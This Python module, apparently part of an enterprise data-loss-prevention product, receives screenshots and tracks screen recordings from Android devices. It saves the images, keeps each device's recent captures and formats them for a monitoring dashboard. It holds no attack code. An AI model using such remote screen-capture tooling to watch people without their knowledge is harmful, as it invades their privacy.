"""
ATHEX DLP Enterprise - Screen Module
=====================================
Processes screenshot/screen recording data from Android devices.
"""

import json
import logging
import base64
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, Optional

logger = logging.getLogger(__name__)


class ScreenHandler:
    """Handles screen capture data"""
    
    def __init__(self):
        self.screenshots: Dict[str, list] = {}
        self.recordings: Dict[str, list] = {}
        self.screenshot_dir = Path("data/screenshots")
        self.recording_dir = Path("data/recordings")
        self.screenshot_dir.mkdir(parents=True, exist_ok=True)
        self.recording_dir.mkdir(parents=True, exist_ok=True)
        self.active_recordings: Dict[str, Dict] = {}
        logger.info("ScreenHandler initialized")
    
    def process(self, session_id: str, raw_data: Any) -> Dict:
        """
        Process screen capture from device.
        
        Args:
            session_id: Device session ID
            raw_data: Base64 encoded image or dict with capture data
            
        Returns:
            Processed capture data
        """
        try:
            image_base64 = None
            metadata = {}
            
            if isinstance(raw_data, str):
                image_base64 = raw_data
            elif isinstance(raw_data, dict):
                image_base64 = raw_data.get("image", raw_data.get("data", raw_data.get("screenshot", "")))
                metadata = {
                    "width": raw_data.get("width", 0),
                    "height": raw_data.get("height", 0),
                    "quality": raw_data.get("quality", 85),
                    "size": raw_data.get("size", 0)
                }
            
            if not image_base64:
                return {"success": False, "error": "No image data"}
            
            # Save screenshot
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{session_id[:8]}_{timestamp}.jpg"
            filepath = self.screenshot_dir / filename
            
            try:
                image_bytes = base64.b64decode(image_base64)
                with open(filepath, 'wb') as f:
                    f.write(image_bytes)
                
                logger.info(f"📸 Screenshot saved: {filename} ({len(image_bytes)} bytes)")
                
            except Exception as e:
                logger.error(f"Failed to save screenshot: {e}")
                filepath = None
            
            # Store
            if session_id not in self.screenshots:
                self.screenshots[session_id] = []
            
            capture = {
                "session_id": session_id,
                "filename": filename,
                "path": str(filepath) if filepath else None,
                "size": len(image_bytes) if image_bytes else 0,
                "size_formatted": self._format_size(len(image_bytes)) if image_bytes else "0 B",
                "width": metadata.get("width", 0),
                "height": metadata.get("height", 0),
                "quality": metadata.get("quality", 85),
                "timestamp": datetime.now().isoformat(),
                "base64_preview": image_base64[:100] + "..." if len(image_base64) > 100 else image_base64
            }
            
            self.screenshots[session_id].append(capture)
            
            # Keep last 30
            if len(self.screenshots[session_id]) > 30:
                self.screenshots[session_id] = self.screenshots[session_id][-30:]
            
            return {
                "success": True,
                "capture": capture
            }
            
        except Exception as e:
            logger.error(f"Error processing screen capture: {e}")
            return {"success": False, "error": str(e)}
    
    def start_recording(self, session_id: str) -> Dict:
        """Track active screen recording"""
        self.active_recordings[session_id] = {
            "started_at": datetime.now().isoformat(),
            "status": "recording"
        }
        logger.info(f"🎬 Screen recording started for {session_id}")
        return {"success": True, "message": "Recording started"}
    
    def stop_recording(self, session_id: str) -> Dict:
        """Stop screen recording"""
        if session_id in self.active_recordings:
            started = datetime.fromisoformat(self.active_recordings[session_id]["started_at"])
            duration = (datetime.now() - started).total_seconds()
            del self.active_recordings[session_id]
            
            logger.info(f"🎬 Recording stopped for {session_id} ({duration:.1f}s)")
            return {"success": True, "duration": duration, "duration_formatted": f"{duration:.1f}s"}
        
        return {"success": False, "error": "No active recording"}
    
    def get_screenshots(self, session_id: str, limit: int = 10) -> list:
        """Get recent screenshots"""
        screenshots = self.screenshots.get(session_id, [])
        return screenshots[-limit:]
    
    def get_screenshot_file(self, filename: str) -> Optional[Path]:
        """Get screenshot file path"""
        filepath = self.screenshot_dir / filename
        if filepath.exists():
            return filepath
        return None
    
    def get_all_screenshots_count(self) -> Dict[str, int]:
        """Get screenshot count per device"""
        return {sid: len(shots) for sid, shots in self.screenshots.items()}
    
    def _format_size(self, size_bytes: int) -> str:
        for unit in ['B', 'KB', 'MB']:
            if size_bytes < 1024:
                return f"{size_bytes:.1f} {unit}"
            size_bytes /= 1024
        return f"{size_bytes:.1f} GB"
    
    def format_for_dashboard(self, screenshots: list) -> list:
        """Format screenshots for dashboard"""
        return [
            {
                "filename": s.get("filename", ""),
                "size": s.get("size_formatted", "0 B"),
                "dimensions": f"{s.get('width', 0)}x{s.get('height', 0)}",
                "time": s.get("timestamp", "")[-8:] if s.get("timestamp") else "",
                "quality": f"{s.get('quality', 85)}%"
            }
            for s in screenshots
        ]
    
    def is_recording(self, session_id: str) -> bool:
        """Check if device is being recorded"""
        return session_id in self.active_recordings


screen_handler = ScreenHandler()